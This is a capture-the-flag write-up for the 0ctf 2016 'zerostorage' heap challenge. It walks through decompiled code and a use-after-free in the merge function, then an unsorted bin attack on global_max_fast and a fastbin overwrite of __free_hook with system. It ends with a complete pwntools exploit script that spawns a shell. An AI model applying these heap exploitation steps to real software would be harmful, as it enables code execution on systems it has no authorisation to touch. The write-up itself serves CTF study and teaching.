# 0ctf 2016 - Zerostorage

## Static Analysis

First, we will understand how the binary functions and see what sort of constraints we will have to face. To begin, let's see what type of type of file this is and what mitigations it holds.

```
➜  zerostorage file zerostorage
zerostorage: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=93c36d63b011f873b2ba65c8562c972ffbea10d9, stripped
➜  zerostorage checksec zerostorage
[*] '/home/vagrant/pwning/0ctf16/zerostorage/zerostorage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

As can be seen, this is a 64-bit ELF and there are all mitigation techniques. RELRO is full so the global offset table will not be exploitable, and PIE is enabled so we should look for a leak before exploiting.

Now let's look at this binary in Ghidra. The main function is located at address 100c40, and this contains a menu of options. 

```
  puts("== Zero Storage ==");
  puts("1. Insert");
  puts("2. Update");
  puts("3. Merge");
  puts("4. Delete");
  puts("5. View");
  puts("6. List");
  puts("7. Exit");
  puts("==================");
  __printf_chk(1,"Your choice: ");
```

This menu function shows that we have a few standard options for a heap exploitation challenge. We can create, delete, edit, and view chunks. Also, we can merge chunks, which I have never seen before. Additionally we can list chunks and exit, so let's explore a few important functions to see what happens.

Before this menu is printed, a function at 00100f20 is called. This function sets buffering for stdin and stdout, and it also sets an alarm (common practice for CTF challenges). Additionally, /dev/urandom is opened and 8 bytes are read into a global variable. For now we can call this variable GLOBAL_KEY, and we will see how this is used later.

```
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  __stream = fopen("/dev/urandom","rb");
  if (__stream != (FILE *)0x0) {
    bytes_read = fread(&GLOBAL_KEY,1,8,__stream);
    if (bytes_read == 8) {
      fclose(__stream);
      return;
    }
  }
```

### Insert

The insert function is located at 00100fd0. Here, we can see that the size of our chunk must be between 0x80 and 0x1000. With the metadata, that means we can only make heaps of sizes at least 0x90. This means that we cannot use fastbins, so we will have to find another exploitation type. Also, we can see that the pointers are xored with a global key before they are stored in the binary, so it may be hard to exploit these. Luckily, we will be able to use the unsorted bin, so we will look into that attack after the static analysis.

```
      if (0 < entry_length) {
        intermediate_len = 0x1000;
        if (entry_length < 0x1001) {
          intermediate_len = entry_length;
        }
        final_len = 0x80;
        if (0x7f < intermediate_len) {
          final_len = intermediate_len;
        }
        chunk_ptr = calloc((long)final_len,1);
```

After this, the pointer to the chunk and size are saved into some special global variables. I labelled these arrays as follows:

```
          enc_ptr = (ulong)chunk_ptr ^ GLOBAL_KEY;
          (&IN_USE)[lVar2 * 6] = 1;
          (&CHUNK_SIZES)[lVar2 * 3] = (long)intermediate_len;
          (&ENC_PTR)[lVar2 * 3] = enc_ptr;
          NUM_CHUNKS = NUM_CHUNKS + 1;
```

### Delete

The delete function is located at 00101530. This delete function free's the heap pointer at the index of choice, and it also zeros out this pointer before returning. This should be effective for preventing a use after free, so this function does not appear to be exploitable. Additionally, it makes sure that the chunk is in use before freeing it, so this prevents double frees.

```
  if ((uint)heap_index < 0x20) {
    index = (long)(int)(uint)heap_index;
    if ((&IN_USE)[index * 6] == 1) {
      enc_ptr = (&ENC_PTR)[index * 3];
      (&IN_USE)[index * 6] = 0;
      (&CHUNK_SIZES)[index * 3] = 0;
      NUM_CHUNKS = NUM_CHUNKS + -1;
      free((void *)(enc_ptr ^ GLOBAL_KEY));
      (&ENC_PTR)[index * 3] = 0;
      __printf_chk(1,"Entry %d is successfully deleted.\n",heap_index & 0xffffffff);
      return;
    }
  }
```

### View

The view function (00101600) show's the size of bytes from the heap pointer. This function could possibly be used to get an info leak later on, but we still have not found an exploitable bug that could let us use a free heap.

```
  entry_num = get_choice();
  if ((entry_num < 0x20) && (this_entry = (long)(int)entry_num, (&IN_USE)[this_entry * 6] == 1)) {
    __printf_chk(1,"Entry No.%d:\n",(ulong)entry_num);
    print_buffer((&ENC_PTR)[this_entry * 3] ^ GLOBAL_KEY,(&CHUNK_SIZES)[this_entry * 3]);
    puts("");
    return;
  }
```

### Merge

The merge function (located at 001012c0) has two different possible code paths. If the combined size of the two chunks is the same as either chunk or less than 0x80, a new index is created but the merge to poinnter is used. However, if they are different, a realloc is performed to create a new chunk. Then, the merge from chunk is freed. This is a problem because if the two indeces are the same, the chunk will be freed and the newly created chunk will point to this freed region. This let's us use and view a free chunk, which is perfect! 

```
              if (total_size_final != to_size_final) {
                to_ptr = realloc(to_ptr,total_size_final);
                if (to_ptr == (void *)0x0) {
                  fwrite("Memory Error.\n",1,0xe,stderr);
                    /* WARNING: Subroutine does not return */
                  exit(-1);
                }
                from_size = (&CHUNK_SIZES)[from_index * 3];
                to_size = (&CHUNK_SIZES)[to_index * 3];
              }
              memcpy((void *)((long)to_ptr + to_size),
                     (void *)(GLOBAL_KEY ^ (&ENC_PTR)[from_index * 3]),from_size);
              key = GLOBAL_KEY;
              new_index = (long)(int)this_index;
              (&ENC_PTR)[new_index * 3] = (ulong)to_ptr ^ GLOBAL_KEY;
              from_ptr = (&ENC_PTR)[from_index * 3];
              (&IN_USE)[new_index * 6] = 1;
              (&CHUNK_SIZES)[new_index * 3] = total_size;
              (&IN_USE)[from_index * 6] = 0;
              (&CHUNK_SIZES)[from_index * 3] = 0;
              free((void *)(key ^ from_ptr));
```

In order to satisfy this condition, the combination of to and from sizes should be less than 0x80 large. This should be easy to create because we could create two chunks of size 0x20 to merge together. While they would be stored as a size 0x80, the saved size in the global array would be 0x20. Also, we could even merge a chunk with itself to make this more simple, because there is no check that the indeces are different.

### Update

The update function, located at 00101120, lets you create a new chunk at an index. It uses realloc to create a new chunk of the appropriate size, and then you can input the characters in with no overflow. Additionally, it checks to make sure that the chunk is at least 0x80 large, so again fastbin attacks are mitigated.

```
      if (0 < entry_len) {
        int_len = 0x1000;
        if (entry_len < 0x1001) {
          int_len = entry_len;
        }
        min_length = 0x80;
        final_length = 0x80;
        if (0x7f < int_len) {
          final_length = int_len;
        }
        __ptr = (void *)((&ENC_PTR)[lVar2 * 3] ^ GLOBAL_KEY);
        if (0x7f < (ulong)(&CHUNK_SIZES)[lVar2 * 3]) {
          min_length = (int)(&CHUNK_SIZES)[lVar2 * 3];
        }
        if (final_length != min_length) {
          __ptr = realloc(__ptr,(long)final_length);
          if (__ptr == (void *)0x0) {
            fwrite("Memory Error.\n",1,0xe,stderr);
                    /* WARNING: Subroutine does not return */
            exit(-1);
          }
        }
        __printf_chk(1,"Enter your data: ");
        get_chars(__ptr,(long)int_len);
        (&ENC_PTR)[lVar2 * 3] = (ulong)__ptr ^ GLOBAL_KEY;
        (&CHUNK_SIZES)[lVar2 * 3] = (long)int_len;
        __printf_chk(1,"Entry %d is successfully updated.\n",uVar1 & 0xffffffff);
        return;
```

## Unsorted Bin

The unsorted bin attack is a very strong attack when you cannot use fastbins. As you will see, you have less control with the unsorted bin attack, but it is an important building block in any attack. The unsorted bin is a doubly linked list that holds bins before they go into a small or large bin. What this means is that you can modify the pointers to make malloc assume that a chunk is located where you choose to forge the pointers to. I will show this in further detail ahead, but it is similar to a fastbin attack in that you can fake heap chunks. However, the difference is that the address of the heap chunk is written to this pointer, rather than creating a new chunk for you to put data into. It attempts to fix the doubly linked list, but it does not let you make chunks outside of the heap.

To start this unsorted bin attack, we will insert two chunks. The first should have a size of less than 0x80 because this will be the chunk that we merge with itself. We need a second chunk to prevent this chunk from consolidating with the forest, and we can play with the size of this as needed. To test, I will just insert chunks of size 0x20 onto the heap, and they will have 0x1f A's and 0x1f B's. Then, I will merge 0 with 0, to create the use after free. This will create a chunk 2 that points to the freed region, and I can use the view functionality.

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

target = process("./zerostorage")
gdb.attach(target)
raw_input("Begin...")

def insert(size, data):
    target.recvuntil("Your choice: ")
    target.sendline("1")
    target.recvuntil("Length of new entry: ")
    target.sendline(str(size))
    target.recvuntil("Enter your data: ")
    target.sendline(data)

def merge(index1, index2):
    target.recvuntil("Your choice: ")
    target.sendline("3")
    target.recvuntil("Merge from Entry ID: ")
    target.sendline(str(index1))
    target.recvuntil("Merge to Entry ID: ")
    target.sendline(str(index2))

def view(index):
    target.recvuntil("Your choice: ")
    target.sendline("5")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))
    target.recvline()

# Create two chunks, must prevent consolidate into forest
insert(0x20, "A" * 0x1f)  # 0
insert(0x20, "B" * 0x1f)  # 1

# Merge 0 chunk with itself, use after free
merge(0, 0)               # 2

view(2)
```

After viewing this chunk, we can use gdb to determine the offsets of the important addresses. At this point, we determine what we would like to attack with the unsorted bin exploit as well. In libc, there is a global variable known as global_max_fast, and this holds the size of the largest allowable fastbin for free to create. 

```
gef➤  p &global_max_fast
$1 = (size_t *) 0x7f06ef8767f8 <global_max_fast>
gef➤  x/gx 0x7f06ef8767f8
0x7f06ef8767f8 <global_max_fast>:       0x0000000000000080
```

In a standard 64 bit heap, 0x80 is the largest size of any fastbin in the heap. However, we should be able to change this by acting like a fake unsorted bin is stored at this address. However, we will have to subtract 0x10 from this address when we create our fake chunk because we want the forward and backwards pointers to overlap with the global_max_fast. We will calculate the address of this, as well as some other important addresses, by unpacking the 8 bytes that we can view in this freed chunk.

```
leak = u64(target.recv(8))
libc = leak - 0x3c4b78
global_max_fast = libc + 0x3c67f8
system = libc + libc_bin.symbols['system']
free_hook = libc + libc_bin.symbols['__free_hook']
```

To carry out the unsorted bin attack, we will edit the pointers on the chunk and see how they are referenced when a new chunk is created. To do this, we could statically review the code about unsorted bins in the malloc source code. An easier way would be to overwrite the pointers with two different, recognizable values, like "aaaaaaaa" and "bbbbbbbb". Then, when it SEGFAULTS, we can look at the crash to see which pointer was being written to!

```
edit(2, 0x20, "aaaaaaaa" + "bbbbbbbb" + "C" *0xf)

insert(0x20, "D"*0x1f)       # 0
```

Now, let's run this and see where it crashes:

```
Program received signal SIGSEGV, Segmentation fault.
_int_malloc (av=av@entry=0x7f61e1e74b20 <main_arena>, bytes=bytes@entry=0x80) at malloc.c:3516
3516    malloc.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$rax   : 0x7ffff2ac8d3f      →  0x007ffff2ac8d7000
$rbx   : 0x7f61e1e74b20      →  0x0000000100000001
$rcx   : 0x7c
$rdx   : 0x81
$rsp   : 0x7ffff2ac8cc0      →  0x0000000000000009
$rbp   : 0x90
$rsi   : 0x90
$rdi   : 0x7ffff2ac8d40      →  0x00007ffff2ac8d70  →  0x0000000000000080
$rip   : 0x7f61e1b31e10      →  <_int_malloc+656> mov QWORD PTR [r15+0x10], r12
$r8    : 0x0
$r9    : 0x1999999999999999
$r10   : 0x0
$r11   : 0x7f61e1c275e0      →  0x0002000200020002
$r12   : 0x7f61e1e74b78      →  0x000055a5704ae1a0  →  0x0000000000000000
$r13   : 0x55a5704ae000      →  0x0000000000000000
$r14   : 0x2710
$r15   : 0x6262626262626262 ("bbbbbbbb"?)
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $gs: 0x0000  $ss: 0x002b
────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0x00007ffff2ac8cc0│+0x00: 0x0000000000000009     ← $rsp
0x00007ffff2ac8cc8│+0x08: 0x0000000000000080
0x00007ffff2ac8cd0│+0x10: 0x00007ffff2ac8d40  →  0x00007ffff2ac8d70  →  0x0000000000000080
0x00007ffff2ac8cd8│+0x18: 0x00007f61e1bc69ef  →  <__printf_chk+271> test r12d, r12d
0x00007ffff2ac8ce0│+0x20: 0x0000000000000001
0x00007ffff2ac8ce8│+0x28: 0x0000003000000010
0x00007ffff2ac8cf0│+0x30: 0xffff80000d5372c1
0x00007ffff2ac8cf8│+0x38: 0x00007ffff2ac8d3f  →  0x007ffff2ac8d7000
─────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7f61e1b31e03 <_int_malloc+643> je     0x7f61e1b31fa0 <_int_malloc+1056>
   0x7f61e1b31e09 <_int_malloc+649> cmp    rbp, rsi
   0x7f61e1b31e0c <_int_malloc+652> mov    QWORD PTR [rbx+0x70], r15
 → 0x7f61e1b31e10 <_int_malloc+656> mov    QWORD PTR [r15+0x10], r12
   0x7f61e1b31e14 <_int_malloc+660> je     0x7f61e1b322c8 <_int_malloc+1864>
   0x7f61e1b31e1a <_int_malloc+666> cmp    rsi, 0x3ff
   0x7f61e1b31e21 <_int_malloc+673> jbe    0x7f61e1b31d80 <_int_malloc+512>
   0x7f61e1b31e27 <_int_malloc+679> mov    rax, rsi
   0x7f61e1b31e2a <_int_malloc+682> shr    rax, 0x6
──────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "zerostorage", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7f61e1b31e10 → Name: _int_malloc(av=0x7f61e1e74b20 <main_arena>, bytes=0x80)
[#1] 0x7f61e1b34dca → Name: __libc_calloc(n=<optimized out>, elem_size=<optimized out>)
[#2] 0x55a56f54d057 → test rax, rax
[#3] 0x55a56f54d9e6 → cmp eax, 0x3d3d3d3d
[#4] 0x55a56f54dc00 → (bad)
[#5] 0x55a56f54d910 → push r15
[#6] 0x55a56f54cd71 → xor ebp, ebp
[#7] 0x7ffff2ac8ee0 → add DWORD PTR [rax], eax
[#8] 0x55a56f54cd57 → jmp 0x55a56f54cc50
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

As can be seen, the instruction that failed involved writing to an offset of 0x10 from r15. r15 holds all b's at this point, so we can see that it tried to write to the second pointer, the backwards pointer. The value that is being written is some libc address, which turns out to be the head of the unsorted bin list in libc. Let's modify our code to write to the global_max_fast instead, taking into account the offset of 0x10 as well:

```
edit(2, 0x20, "aaaaaaaa" + p64(global_max_fast-0x10) + "C"*0xf)

insert(0x20, "D"*0x1f)       # 0
target.interactive()
```

Now, we will run this and check what value is in the global_max_fast variable:

```
gef➤  x/gx &global_max_fast
0x7fc8cf93b7f8 <global_max_fast>:       0x00007fc8cf939b78
```

Awesome! Now the global_max_fast is a very large value, much larger than 0x80. That means that we can make fastbins of enormous size, so the minimum size of 0x80 is no longer an issue. As with any fastbin attack, we need to find a good place to create a fake fastbin, so we should look for an area that has a good fake size. The best target for a binary with full RELRO is the free hook or the malloc hook. 

```
gef➤  p &__free_hook
$1 = (void (**)(void *, const void *)) 0x7ff1e9e607a8 <__free_hook>
gef➤  x/60gx 0x7ff1e9e607a8 - 0x59
0x7ff1e9e6074f: 0x0000000000000000      0x0000000000000200
0x7ff1e9e6075f: 0x0000000000000000      0x0000000000000000
0x7ff1e9e6076f <list_all_lock+15>:      0x0000000000000000      0x0000000000000000
0x7ff1e9e6077f <_IO_stdfile_2_lock+15>: 0x0000000000000000      0x0000000000000000
0x7ff1e9e6078f <_IO_stdfile_1_lock+15>: 0x0000000000000000      0x0000000000000000
0x7ff1e9e6079f <_IO_stdfile_0_lock+15>: 0x0000000000000000      0x0000000000000000
0x7ff1e9e607af <__free_hook+7>: 0x0000000000000000      0x0000000000000000
0x7ff1e9e607bf <next_to_use.11232+7>:   0x0000000000000000      0x0000000000000000
0x7ff1e9e607cf <using_malloc_checking+3>:       0x0000000000000000      0x0000000000000000
0x7ff1e9e607df <arena_mem+7>:   0x0000000000000000      0x0000000000000000
0x7ff1e9e607ef <free_list+7>:   0x0000000000000000      0x007ff1e9e5eb7800
0x7ff1e9e607ff <global_max_fast+7>:     0x0000000000000000      0x0000000000000000
0x7ff1e9e6080f <root+7>:        0x0000000000000000      0x0000000000000000
0x7ff1e9e6081f <old_realloc_hook+7>:    0x0000000000000000      0x0000000000000000
0x7ff1e9e6082f <old_malloc_hook+7>:     0x0000000000000000      0x0000000000000000
0x7ff1e9e6083f: 0x0000000000000000      0x0000000000000000
0x7ff1e9e6084f <tr_old_realloc_hook+7>: 0x0000000000000000      0x0000000000000000
0x7ff1e9e6085f <tr_old_free_hook+7>:    0x0000000000000000      0x0000000000000000
0x7ff1e9e6086f <mallstream+7>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e6087f <already_called.9953+7>: 0x0000000000000000      0x0000000000000000
0x7ff1e9e6088f <static_buf+7>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e6089f: 0x0000000000000000      0x0000000000000000
0x7ff1e9e608af <local_buf+15>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e608bf <local_buf+31>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e608cf <local_buf+47>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e608df <local_buf+63>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e608ef <local_buf+79>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e608ff <local_buf+95>:  0x0000000000000000      0x0000000000000000
0x7ff1e9e6090f <save_ptr+7>:    0x0000000000000000      0x0000000000000000
0x7ff1e9e6091f: 0x0000000000000000      0x0000000000000000
gef➤
```

We should work with fastbins of size 0x200 in order to create a fake chunk here, and then at offset 0x49 in the chunk we can begin overwriting the free hook! In order to create this chunk, we will have to merge two chunks together that are larger than 0x80. In order to do that, we can merge a chunk with itself that has a size of 0x1f8 / 2, or 0xfc. Then, when it merges with itself it will realloc as 0x1f8 and then free. Let's set chunk 1 to this size, the second chunk that we initially created. Then, we will merge it with itself, and then edit it to overwrite the fastbin pointer with the address of free hook - 0x59. Then, after inserting a chunk of size 0x1f8, we will be ready to insert our fake chunk in libc. This chunk will have 0x49 null bytes, then the packed function pointer, then many other null bytes. This ensures that the next deleted chunk will 

Originally, I wanted to overwrite the free hook with a magic gadget. However, none of the stack offsets were nulls, so they all failed. I decided to overwrite it with system instead, and I put "/bin/sh\x00" in the beginning of chunk 0 before I filled it with D's. 

Here is the final exploit:

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

target = process("./zerostorage")
gdb.attach(target)
raw_input("Begin...")

libc_bin = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def insert(size, data):
    target.recvuntil("Your choice: ")
    target.sendline("1")
    target.recvuntil("Length of new entry: ")
    target.sendline(str(size))
    target.recvuntil("Enter your data: ")
    target.sendline(data)

def merge(index1, index2):
    target.recvuntil("Your choice: ")
    target.sendline("3")
    target.recvuntil("Merge from Entry ID: ")
    target.sendline(str(index1))
    target.recvuntil("Merge to Entry ID: ")
    target.sendline(str(index2))

def view(index):
    target.recvuntil("Your choice: ")
    target.sendline("5")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))
    target.recvline()

def edit(index, size, data):
    target.recvuntil("Your choice: ")
    target.sendline("2")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))
    target.recvuntil("Length of entry: ")
    target.sendline(str(size))
    target.recvuntil("Enter your data: ")
    target.sendline(data)

def delete(index):
    target.recvuntil("Your choice: ")
    target.sendline("4")
    target.recvuntil("Entry ID: ")
    target.sendline(str(index))

# Create two chunks, must prevent consolidate into forest
insert(0x20, "A" * 0x1f)    # 0
insert(0xfc, "B" * 0xfb)    # 1

# Merge 0 chunk with itself, use after free
merge(0, 0)                 # 2

# View chunk 2 to view unsorted bin ptr
view(2)

leak = u64(target.recv(8))
libc = leak - 0x3c4b78
global_max_fast = libc + 0x3c67f8
system = libc + libc_bin.symbols['system']
free_hook = libc + libc_bin.symbols['__free_hook']

log.info("Leak: " + hex(leak))
log.info("Libc: " + hex(libc))
log.info("Global_max_fast: " + hex(global_max_fast))
log.info("System: " + hex(system))

# Edit 2 to overwrite unsorted bin ptr, attack global_max_fast
edit(2, 0x20, "aaaaaaaa" + p64(global_max_fast-0x10) + "C"*0xf)

# /bin/sh to free later, insert triggers unsorted bin attack
insert(0x20, "/bin/sh\x00" + "D"*0x17) # 0

# Large fastbin, size appropriate for attack
merge(1, 1)                  # 3

# Fake fastbin over free hook
payload = p64(free_hook - 0x59)
payload += "A" * (0x1f7 - len(payload))

edit(3, 0x1f8, payload)

insert(0x1f8, "Q"*0x1f7)

# Overwrite free hook
payload2 = "\x00" * 0x49
payload2 += p64(system)
payload2 += "\x00" * (0x1f7 - len(payload2))

insert(0x1f8, payload2)       # 4

delete(0)

target.interactive()
```

I would like to give credit to this writeup for helping me solve an issue with the merging free affecting the fastbin size: https://stfwlg.github.io/archivers/2016\_0ctf-\_zerostorage\_%ED%92%80%EC%9D%B4
